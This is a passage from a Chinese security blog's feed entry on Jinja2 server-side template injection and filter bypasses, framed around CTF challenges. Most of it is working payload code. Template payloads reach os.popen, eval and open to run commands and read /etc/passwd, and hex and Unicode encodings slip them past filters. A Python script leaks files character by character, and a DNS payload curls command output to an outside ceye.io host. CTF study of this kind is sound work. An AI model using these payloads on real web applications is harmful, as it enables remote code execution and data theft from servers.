class="number">213</span>].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure><h4 id="POST">POST</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;</span><br><span class="line">POST:arg1=open&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure><h4 id="Cookie">Cookie</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;</span><br><span class="line">Cookie:arg1=open;arg2=/etc/passwd</span><br></pre></td></tr></table></figure><h4 id="chr绕过">chr绕过</h4><h3 id="过滤-v2">过滤<code>_</code></h3><h4 id="编码绕过">编码绕过</h4><p>使用十六进制编码绕过，<code>_</code>编码后为<code>\x5f</code>，<code>.</code>编码后为<code>\x2E</code></p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fbases\x5f\x5f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]()[<span class="number">376</span>][<span class="string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><p>关键字也可以使用十六进制编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">string1=<span class="string">&quot;__class__&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tohex</span>(<span class="params">string</span>):</span></span><br><span class="line">  result = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</span><br><span class="line">      result=result+<span class="string">&quot;\\x&quot;</span>+hex(ord(string[i]))[<span class="number">2</span>:]</span><br><span class="line">  print(result)</span><br><span class="line">  </span><br><span class="line">tohex(string1)</span><br></pre></td></tr></table></figure><p>比如说NCTF2020 你是我的master吗 这道题：</p><p>waf：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;init&#x27;</span>,<span class="string">&#x27;global&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;req&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;get&#x27;</span>]</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;&quot;&quot;[&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;][&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;][&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;]()[64][&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;][&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;][&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;][&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&quot;](&quot;\x6f\x73&quot;)[&quot;\x70\x6f\x70\x65\x6e&quot;](&quot;ls&quot;)[&quot;\x72\x65\x61\x64&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure><p>全16进制，只能在SSTI的时候用。</p><h4 id="request绕过">request绕过</h4><p>同上</p><h3 id="过滤关键字">过滤关键字</h3><h4 id="双写、大小写">双写、大小写</h4><h4 id="拼接字符">拼接字符</h4><p>+拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span><span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><p>join拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr([<span class="string">&quot;_&quot;</span>*<span class="number">2</span>,<span class="string">&quot;cla&quot;</span>,<span class="string">&quot;ss&quot;</span>,<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]|join)&#125;&#125;</span><br></pre></td></tr></table></figure><p>格式化+管道符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l</span><br></pre></td></tr></table></figure><h4 id="替代方法">替代方法</h4><p>过滤init，可以用<code>__enter__</code>或<code>__exit__</code>替代</p><p>过滤config</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤-v3">过滤<code>[]</code></h3><h4 id="索引中的">索引中的<code>[]</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>][<span class="number">1</span>]</span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>].pop(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>].__getitem__(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br></pre></td></tr></table></figure><p>Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">433</span>).__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().pop(<span class="number">433</span>).__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="魔术方法中的">魔术方法中的<code>[]</code></h4><p>魔术方法中本来是没有中括号的，但是如果需要使用<code>[]</code>绕过关键字的话，可以用<code>__getattribute__</code>绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>).__base__&#125;&#125;</span><br></pre></td></tr></table></figure><p>也可以配合<code>requests</code>绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__&#125;&#125;&amp;arg1&#x3D;__class__</span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(<span class="number">376</span>).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami</span><br></pre></td></tr></table></figure><h3 id="过滤-v4">过滤<code>&#123;&#125;</code></h3><h4 id="DNSLOG外带数据">DNSLOG外带数据</h4><p>用<code>&#123;%%&#125;</code>替代，使用判断语句进行dns外带数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> ().__class__.__base__.__subclasses__()[<span class="number">433</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;curl `whoami`.k1o75b.ceye.io&quot;</span>).read()==<span class="string">&#x27;ssti&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h4 id="盲注">盲注</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ip:5000/?name=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r = requests.get(url+payload).content</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;kawhi&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s = <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        payload = <span class="string">&#x27;&#123;% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read()[&#x27;</span>+str(i)+<span class="string">&#x27;:&#x27;</span>+str(i+<span class="number">1</span>)+<span class="string">&#x27;] == &quot;&#x27;</span>+c+<span class="string">&#x27;&quot; %&#125;kawhi&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> password</span><br></pre></td></tr></table></figure><h4 id="print标记">print标记</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)%&#125;</span><br></pre></td></tr></table></figure><h2 id="Bypass-Plus">Bypass Plus</h2><p>介绍一些常见过滤组合和最近的赛题。</p><h3 id="过滤-，-和">过滤<code>_</code>，<code>.</code>和<code>'</code></h3><p>python3下可以使用<code>_frozen_importlib_external.FileLoader</code>的<code>get_data()</code>方法，第一个是参数0，第二个为要读取的文件名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">222</span>].get_data(<span class="number">0</span>,<span class="string">&quot;app.py&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>下划线可以用编码绕过和<code>requests</code>绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5F\x5Fbases\x5F\x5F&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;</span>]()[<span class="number">222</span>][<span class="string">&quot;get\x5Fdata&quot;</span>](<span class="number">0</span>, <span class="string">&quot;app\x2Epy&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤args，-和">过滤<code>args</code>，<code>.</code>和<code>_</code></h3><p>参考y1ng师傅的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x1&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x2&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x3&#x27;</span>])()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(<span class="number">40</span>)|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x5&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x6&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x7&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x8&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x9&#x27;</span>])&#125;&#125;</span><br><span class="line"></span><br><span class="line">post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="Update">Update</h2><h3 id="Unicode绕过">Unicode绕过</h3><p>安洵杯2020 EasyFlask：<a href="https://github.com/D0g3-Lab/i-SOON_CTF_2020">https://github.com/D0g3-Lab/i-SOON_CTF_2020</a></p><p>GitHub上的题目环境有点问题，文件给的好像不全。</p><p>可以看一下过滤：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219211009.png" alt=""></p><p>直接来看payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(%<span class="number">22</span>\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%<span class="number">22</span>))|attr(%<span class="number">22</span>\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%<span class="number">22</span>)(%<span class="number">22</span>os%<span class="number">22</span>)|attr(%<span class="number">22</span>popen%<span class="number">22</span>)(%<span class="number">22</span>whoami%<span class="number">22</span>)|attr(%<span class="number">22</span>read%<span class="number">22</span>)()%&#125;</span><br></pre></td></tr></table></figure><p>其中<code>print</code>用来绕过<code>&#123;&#123;&#125;&#125;`，`attr`绕过`.`。然后这里的`lipsum`是一个方法，可以直接调用os方法，也可以使用`__buildins__`：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>再使用Unicode编码绕过![](https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219211449.png)<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>所以官方给的payload就是：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(<span class="string">&quot;__globals__&quot;</span>))|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;os&quot;</span>)|attr(<span class="string">&quot;popen&quot;</span>)(<span class="string">&quot;whoami&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)()%&#125;</span><br></pre></td></tr></table></figure>在线网址转换：https://www.branah.com/unicode-converterPHP脚本转换：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//字符串转Unicode编码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_encode</span>(<span class="params">$strLong</span>) </span>&#123;</span><br><span class="line">  $strArr = preg_split(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, $strLong);<span class="comment">//拆分字符串为数组(含中文字符)</span></span><br><span class="line">  $resUnicode = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">foreach</span> ($strArr <span class="keyword">as</span> $str)</span><br><span class="line">  &#123;</span><br><span class="line">      $bin_str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      $arr = is_array($str) ? $str : str_split($str);<span class="comment">//获取字符内部数组表示,此时$arr应类似array(228, 189, 160)</span></span><br><span class="line">      <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value)</span><br><span class="line">      &#123;</span><br><span class="line">          $bin_str .= decbin(ord($value));<span class="comment">//转成数字再转成二进制字符串,$bin_str应类似111001001011110110100000,如果是汉字&quot;你&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      $bin_str = preg_replace(<span class="string">&#x27;/^.&#123;4&#125;(.&#123;4&#125;).&#123;2&#125;(.&#123;6&#125;).&#123;2&#125;(.&#123;6&#125;)$/&#x27;</span>, <span class="string">&#x27;$1$2$3&#x27;</span>, $bin_str);<span class="comment">//正则截取, $bin_str应类似0100111101100000,如果是汉字&quot;你&quot;</span></span><br><span class="line">      $unicode = dechex(bindec($bin_str));<span class="comment">//返回unicode十六进制</span></span><br><span class="line">      $_sup = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">4</span> - strlen($unicode); $i++)</span><br><span class="line">      &#123;</span><br><span class="line">          $_sup .= <span class="string">&#x27;0&#x27;</span>;<span class="comment">//补位高字节 0</span></span><br><span class="line">      &#125;</span><br><span class="line">      $str =  <span class="string">&#x27;\\u&#x27;</span> . $_sup . $unicode; <span class="comment">//加上 \u  返回</span></span><br><span class="line">      $resUnicode .= $str;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $resUnicode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Unicode编码转字符串方法1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_decode</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 转换编码，将Unicode编码转换成可以浏览的utf-8编码</span></span><br><span class="line">  $pattern = <span class="string">&#x27;/([\w]+)|(\\\u([\w]&#123;4&#125;))/i&#x27;</span>;</span><br><span class="line">  preg_match_all($pattern, $name, $matches);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">empty</span>($matches))</span><br><span class="line">  &#123;</span><br><span class="line">    $name = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; count($matches[<span class="number">0</span>]); $j++)</span><br><span class="line">    &#123;</span><br><span class="line">      $str = $matches[<span class="number">0</span>][$j];</span><br><span class="line">      <span class="keyword">if</span> (strpos($str, <span class="string">&#x27;\\u&#x27;</span>) === <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        $code = base_convert(substr($str, <span class="number">2</span>, <span class="number">2</span>), <span class="number">16</span>, <span class="number">10</span>);</span><br><span class="line">        $code2 = base_convert(substr($str, <span class="number">4</span>), <span class="number">16</span>, <span class="number">10</span>);</span><br><span class="line">        $c = chr($code).chr($code2);</span><br><span class="line">        $c = iconv(<span class="string">&#x27;UCS-2&#x27;</span>, <span class="string">&#x27;UTF-8&#x27;</span>, $c);</span><br><span class="line">        $name .= $c;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        $name .= $str;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Unicode编码转字符串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_decode2</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">  $json = <span class="string">&#x27;&#123;&quot;str&quot;:&quot;&#x27;</span> . $str . <span class="string">&#x27;&quot;&#125;&#x27;</span>;</span><br><span class="line">  $arr = json_decode($json, <span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">empty</span>($arr)) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> $arr[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> unicode_encode(<span class="string">&#x27;__class__&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> unicode_decode(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>);</span><br><span class="line"><span class="comment">//\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f__class__</span></span><br></pre></td></tr></table></figure>### 魔改字符太湖杯easy_web，上面所说的过滤双大括号，在一些特定的题目可以魔改`&#123;&#123;&#125;&#125;</code>，比如说这道题由于有个字符规范器可以把我们输入的文本标准化，所以可以使用这种方法。</p><p>可以在Unicode字符网站寻找绕过的字符，直接在网址搜索<code>&#123;</code>，就会出现类似的字符，就可以找到<code>︷</code>和<code>︸</code>了，网址：<a href="https://www.compart.com/en/unicode/U+FE38">https://www.compart.com/en/unicode/U+FE38</a></p><p>Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">︷︷config︸︸</span><br><span class="line">%EF%B8%B7%EF%B8%B7config%EF%B8%B8%EF%B8%B</span><br></pre></td></tr></table></figure><h2 id="Reference">Reference</h2><p><a href="http://www.cl4y.top/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">http://www.cl4y.top/ssti模板注入学习/</a></p><p><a href="https://xi4or0uji.github.io/2019/01/15/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">https://xi4or0uji.github.io/2019/01/15/flask之ssti模板注入/</a></p><p><a href="https://www.m00nback.xyz/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://www.m00nback.xyz/2020/02/16/Python沙箱逃逸/</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html#mr4YxS2y">https://www.cnblogs.com/bmjoker/p/13508538.html#mr4YxS2y</a></p><p><a href="https://blog.szfszf.top/article/15/">https://blog.szfszf.top/article/15/</a></p><p><a href="https://p0sec.net/index.php/archives/120/">https://p0sec.net/index.php/archives/120/</a></p><p><a href="https://xz.aliyun.com/t/8029">https://xz.aliyun.com/t/8029</a></p><p><a href="https://xz.aliyun.com/t/7746">https://xz.aliyun.com/t/7746</a></p><p><a href="https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ">https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;jinja2-SSTI-Bypass&quot;&gt;jinja2 SSTI &amp;amp; Bypass&lt;/h1&gt;
&lt;p&gt;本文主要针对jinja2的SSTI做一些讲解和说明。&lt;/p&gt;
&lt;h2 id=&quot;常用的内建属性&quot;&gt;常用的内建属性&lt;/h2&gt;
&lt;h3 id=&quot;class&quot;&gt;&lt;co
      
    
    </summary>
    
    
      <category term="Web安全基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="SSTI" scheme="http://ca0y1h.top/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入手册</title>
    <link href="http://ca0y1h.top/Web_security/basic_learning/27.SQL%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C/"/>
    <id>http://ca0y1h.top/Web_security/basic_learning/27.SQL%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C/</id>
    <published>2020-12-10T15:13:56.000Z</published>
    <updated>2021-01-03T02:50:21.549Z</updated>
    
